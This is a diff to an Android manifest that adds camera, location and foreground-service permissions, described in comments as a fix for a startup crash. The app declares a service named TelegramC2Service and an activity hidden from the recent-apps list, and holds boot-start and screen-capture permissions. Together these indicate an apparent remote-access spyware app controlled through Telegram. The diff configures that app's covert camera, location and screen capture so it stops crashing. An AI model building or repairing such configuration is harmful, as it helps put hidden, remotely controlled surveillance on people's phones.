@@ -5,13 +5,17 @@
 
     <!-- Core Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-
-    <!-- ADDED: Essential for starting foreground services from the background on Android 13+ -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
 
-    <!-- Required for the foreground service type declaration -->
+    <!--
+    FIXED: Added the required permissions that directly correspond to the
+    foregroundServiceType declarations in the <service> tag below.
+    This is mandatory on newer Android versions and resolves the startup crash.
+    -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
 
     <!-- Feature Permissions -->
@@ -46,7 +50,7 @@
             android:taskAffinity=""
             android:excludeFromRecents="true"/>
 
-        <!-- FIXED: Added all required foregroundServiceType declarations -->
+        <!-- The foregroundServiceType must have corresponding permissions declared above -->
         <service
             android:name=".TelegramC2Service"
             android:enabled="true"
